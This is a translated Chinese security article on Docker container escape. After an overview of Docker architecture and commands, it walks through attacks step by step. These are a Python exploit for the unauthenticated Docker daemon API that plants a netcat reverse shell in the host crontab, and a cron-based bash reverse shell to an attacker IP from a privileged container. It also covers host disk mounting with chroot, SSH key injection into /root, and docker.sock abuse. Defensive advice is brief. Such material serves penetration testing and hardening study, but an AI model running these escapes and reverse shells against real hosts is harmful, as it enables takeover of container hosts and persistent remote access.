# 【容器安全防线】Docker攻击方式与防范技术探究
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
**什么是Docker？**
Docker
是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。
一个完整的Docker有以下几个部分组成：
1、DockerClient客户端
2、Docker Daemon守护进程
3、Docker Image镜像
4、DockerContainer容器
**Docker架构**
Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker
镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。
Docker采用 C/S架构 Docker daemon 作为服务端接受来自客户的请求，并处理这些请求（创建、运行、分发容器）。
客户端和服务端既可以运行在一个机器上，也可通过 socket 或者RESTful API 来进行通信。
Docker daemon 一般在宿主主机后台运行，等待接收来自客户端的消息。 Docker 客户端则为用户提供一系列可执行命令，用户用这些命令实现跟
Docker daemon 交互。
**Docker常见命令**
列出镜像列表
docker images
列出容器列表
docker ps -a
停止和删除容器
docker stop/rm [CONTAINER ID]
删除镜像
docker rmi [IMAGE ID]
PS:删除镜像时，需要先停止运行的容器
查询镜像
docker search [NAME]
获取镜像
docker pull [NAME]
交互式方法启动镜像
docker run -it [REPOSITORY] /bin/bash
访问容器
docker exec -it [CONTAINER ID] /bin/bash
退出容器
exit/ctrl+p+q
**如何判断当前机器是否为Docker容器环境**
进程数很少
常见的一些命令无法使用
查看根目录下是否存在
.dockerenv文件
docker环境下：ls -alh /.dockerenv
非docker环境，没有.dockerenv文件
利用
cat /proc/1/cgroup 是否存在docker相关信息
通过
mount查看挂载磁盘是否存在docker相关信息
**Docker攻击手法**
**Docker危险配置引起的逃逸**
安全往往在痛定思痛时得到发展。在这些年的迭代中，容器社区一直在努力将”纵深防御”、”最小权限”等理念和原则落地。例如，Docker已经将容器运行时的Capabilities黑名单机制改为如今的默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。
然而，无论是细粒度权限控制还是其他安全机制，用户都可以通过修改容器环境配置或在运行容器时指定参数来缩小或扩大约束。如果用户为不完全受控的容器提供了某些危险的配置参数，就为攻击者提供了一定程度的逃逸可能性，有的时候用户才是安全最大的隐患。
**docker daemon api 未授权访问漏洞**
Vulhub提供了docker daemon api 未授权访问漏洞的漏洞环境
[https://](https://link.zhihu.com/?target=https%3A//github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)[github.com/vulhub/vulhu](https://link.zhihu.com/?target=https%3A//github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)[b/tree/master/docker/unauthorized-rce](https://link.zhihu.com/?target=https%3A//github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)
编译及启动漏洞环境:
docker-compose build
docker-compose up -d
环境启动后，docker daemon api的端口为2375端口
利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。
反弹shell的exp:
import docker
client =
docker.DockerClient(base_url=’[http://](https://link.zhihu.com/?target=http%3A//your-ip)[your-ip](https://link.zhihu.com/?target=http%3A//your-ip):[2375/’)](https://link.zhihu.com/?target=http%3A//your-ip%3A2375/)
data = client.containers.run(‘alpine:latest’, r”’sh –[c “echo ‘* * * * *
/](https://link.zhihu.com/?target=http%3A//your-ip%3A2375/)usr/bin/nc your-ip
21 -e /bin/sh’ >> /tmp/etc/crontabs/root” ”’, remove=True, volumes={‘/etc’:
{‘bind’: ‘/tmp/etc’, ‘mode’: ‘rw’}})
也可直接利用github上的exp进行攻击
[https://](https://link.zhihu.com/?target=https%3A//github.com/Tycx2ry/docker_api_vul)[github.com/Tycx2ry/dock](https://link.zhihu.com/?target=https%3A//github.com/Tycx2ry/docker_api_vul)[er_api_vul](https://link.zhihu.com/?target=https%3A//github.com/Tycx2ry/docker_api_vul)
修复方案
1.关闭2375端口（尤其是公网情况下一定要禁用此端口）
2.在防火墙上配置禁止外网访问2375端口
**privileged特权模式启动docker**
启动Docker容器。使用–privileged参数时，容器可以完全访问所有设备，并且不受seccomp，AppArmor和Linux
capabilities的限制。
利用特权模式启动一个docker容器
docker run -it –privileged centos /bin/bash
查看当前容器是否是特权容器
cat /proc/1/status | grep Cap
如果查询的值是0000000xffffffff，可以说明当前容器是特权容器。
查看磁盘文件,发现宿主机设备为/dev/sda1
fdisk -l
在特权模式下，直接在容器内挂载宿主机磁盘，接着切换根目录。
新建一个目录: mkdir /mb
挂载宿主机磁盘到新建的目录: mount /dev/sda2 /mb
切换根目录: chroot /mb
chroot是change root，改变程序执行时所参考的根目录位置，chroot可以增加系统的安全性，限制使用者能够做的事。
创建计划任务，反弹宿主机Shell
echo ‘* * * * * /bin/bash -i >& /dev/tcp/192.168.58.138/6666 0>&1’ >>
/mb/var/spool/cron/crontabs/root
挂载宿主机的root目录到容器，写入SSH私钥登录
docker run -it -v /root:/root centos /bin/bash
mkdir /root/.ssh
cat id_rsa.pub >> /root/.ssh/authorized_keys
相关启动参数存在的安全问题：
Docker 通过Linux
namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。
–cap-add=SYS_ADMIN 启动时，允许执行mount特权操作，需获得资源挂载进行利用。
–net=host 启动时，绕过Network Namespace
–pid=host 启动时，绕过PID Namespace
–ipc=host 启动时，绕过IPC Namespace
**危险挂载docker.sock到容器内部**
在docker容器中调用和执行宿主机的docker，将docker宿主机的docker文件和docker.sock文件挂载到容器中，可以理解为套娃。
docker run –rm -it \
-v /var/run/docker.sock:/var/run/docker.sock \
-v /usr/bin/docker:/usr/bin/docker \
ubuntu \
/bin/bash
通过find在容器中查找docker.sock
find / -name docker.sock
查看宿主机docker信息
docker -H unix://var/run/docker.sock info
运行一个新的容器并挂载宿主机根路径
docker -H unix:///var/run/docker.sock run -it -v /:/mb ubuntu /bin/bash
在新容器的/mb 目录下，就可以访问到宿主机的全部资源
ls -al /mb
在新容器内执行chroot将根目录切换到挂载的宿主机根目录
chroot /mb
成功逃逸到宿主机。